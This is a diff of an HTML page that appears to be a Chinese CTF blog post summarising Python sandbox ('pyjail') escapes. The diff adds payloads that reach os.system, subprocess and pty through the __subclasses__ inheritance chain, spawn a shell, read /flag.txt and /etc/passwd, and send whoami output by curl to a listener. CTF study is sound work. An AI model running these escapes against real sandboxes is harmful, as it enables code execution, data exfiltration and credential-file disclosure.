@@ -31,7 +31,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/scofield1920.github.io\/pyjail_summury\/"
-        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "misc, manual","wordcount":  895 ,
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "misc, manual","wordcount":  1331 ,
         "url": "http:\/\/scofield1920.github.io\/pyjail_summury\/","datePublished": "2024-10-14T00:00:00+08:00","dateModified": "2024-10-14T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -144,8 +144,9 @@
         <li><a href="#恢复-sysmodules">恢复 sys.modules</a></li>
         <li><a href="#rce_payload">rce_payload</a></li>
         <li><a href="#bypass">bypass</a></li>
-        <li><a href="#getattr-函数">getattr 函数</a></li>
-        <li><a href="#pyjail一般思路">pyjail一般思路</a></li>
+        <li><a href="#python-继承链">python 继承链</a></li>
+        <li><a href="#海象运算符">海象运算符</a></li>
+        <li><a href="#ast-沙箱绕过">AST 沙箱绕过</a></li>
         <li><a href="#参考文档">参考文档</a></li>
       </ul>
     </li>
@@ -155,7 +156,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a>&nbsp;<a href="/categories/manual/"><i class="far fa-folder fa-fw"></i>Manual</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;895 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-10-14">2024-10-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1331 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -174,8 +175,9 @@
         <li><a href="#恢复-sysmodules">恢复 sys.modules</a></li>
         <li><a href="#rce_payload">rce_payload</a></li>
         <li><a href="#bypass">bypass</a></li>
-        <li><a href="#getattr-函数">getattr 函数</a></li>
-        <li><a href="#pyjail一般思路">pyjail一般思路</a></li>
+        <li><a href="#python-继承链">python 继承链</a></li>
+        <li><a href="#海象运算符">海象运算符</a></li>
+        <li><a href="#ast-沙箱绕过">AST 沙箱绕过</a></li>
         <li><a href="#参考文档">参考文档</a></li>
       </ul>
     </li>
@@ -418,9 +420,17 @@
 </span><span class="lnt">35
 </span><span class="lnt">36
 </span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#起手式</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat ./flag.txt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#起手式</span>
 </span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
@@ -678,12 +688,23 @@
 </span><span class="lnt">214
 </span><span class="lnt">215
 </span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#字符串拼接</span>
 </span></span><span class="line"><span class="cl"><span class="s1">&#39;sys&#39;</span><span class="o">+</span><span class="s1">&#39;tem&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;system&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;__imp&#39;</span><span class="p">,</span><span class="s1">&#39;ort__&#39;</span><span class="p">])</span> <span class="o">=&gt;</span> <span class="s1">&#39;__import__&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#unicode绕过</span>
+</span></span><span class="line"><span class="cl"><span class="n">相似</span> <span class="n">unicode</span> <span class="n">寻找网站</span><span class="err">：</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">shapecatcher</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">可以通过绘制的方式寻找相似字符</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#下划线被过滤</span>
 </span></span><span class="line"><span class="cl"><span class="nb">dir</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="s1">&#39;_&#39;</span>
@@ -787,7 +808,6 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">#过滤运算符</span>
-</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">==</span> <span class="n">用</span> <span class="ow">in</span> <span class="n">来替换</span>
 </span></span><span class="line"><span class="cl"><span class="ow">or</span> <span class="n">可以用</span><span class="o">|</span> <span class="o">+</span> <span class="o">-...-</span><span class="n">来替换</span>
 </span></span><span class="line"><span class="cl"><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="p">:</span>
@@ -898,45 +918,212 @@
 </span></span><span class="line"><span class="cl">    <span class="k">pass</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="getattr-函数" class="headerLink">
-    <a href="#getattr-%e5%87%bd%e6%95%b0" class="header-mark"></a>getattr 函数</h3><p>内置函数，用于获取一个对象的属性或者方法。</p>
-<h3 id="pyjail一般思路" class="headerLink">
-    <a href="#pyjail%e4%b8%80%e8%88%ac%e6%80%9d%e8%b7%af" class="header-mark"></a>pyjail一般思路</h3><p><strong>RCE方法</strong></p>
+</div><h3 id="python-继承链" class="headerLink">
+    <a href="#python-%e7%bb%a7%e6%89%bf%e9%93%be" class="header-mark"></a>python 继承链</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># os</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;_wrap_close&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;system&#34;</span><span class="p">](</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># subprocess </span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;Popen&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">](</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># builtins</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;_GeneratorContextManagerBase&#34;</span> <span class="ow">and</span> <span class="s2">&#34;os&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># help</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;_GeneratorContextManagerBase&#34;</span> <span class="ow">and</span> <span class="s2">&#34;os&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">][</span><span class="s1">&#39;help&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;_wrap_close&#34;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#sys</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;sys&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;sys&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&#34;os&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;&#39;_sitebuiltins.&#34;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&#34;_Helper&#34;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;sys&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s2">&#34;os&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#commands (not very common)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;commands&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;commands&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#pty (not very common)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;pty&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;pty&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#importlib</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;importlib&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;importlib&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">import_module</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;importlib&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;importlib&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#imp</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;&#39;imp.&#34;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;importlib&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">import_module</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;&#39;imp.&#34;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;importlib&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#pdb</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;pdb&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;pdb&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ctypes</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;builtins&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;ctypes&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">CDLL</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># multiprocessing</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="s2">&#34;wrapper&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="p">)</span> <span class="ow">and</span> <span class="s2">&#34;builtins&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span> <span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s2">&#34;builtins&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;multiprocessing&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">Process</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="k">lambda</span><span class="p">:</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;curl localhost:9999/?a=`whoami`&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#file</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="n">x</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;FileLoader&#34;</span> <span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="海象运算符" class="headerLink">
+    <a href="#%e6%b5%b7%e8%b1%a1%e8%bf%90%e7%ae%97%e7%ac%a6" class="header-mark"></a>海象运算符</h3><p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。</p>
+<p>海象表达式的语法形式如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="err">一种是</span><span class="n">object</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span><span class="o">`</span><span class="err">中找到</span><span class="o">`</span><span class="n">os</span><span class="o">`</span><span class="err">模块中的类（一般是</span><span class="o">`&lt;</span><span class="n">class</span><span class="w"> </span><span class="s1">&#39;os._wrap_close&#39;</span><span class="o">&gt;`</span><span class="err">），另一种是先拿到</span><span class="o">`</span><span class="n">__builtins__</span><span class="o">`</span><span class="err">，再</span><span class="o">`</span><span class="nf">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>RCE的payload模板可以通过chrome中hackbar插件SSTI的Show subclasses with tuple拿到；</p>
-<p>利用第一种方法时，注意本地环境和远程环境中<code>os</code>模块中的类的索引（偏移量）可能不相同；</p>
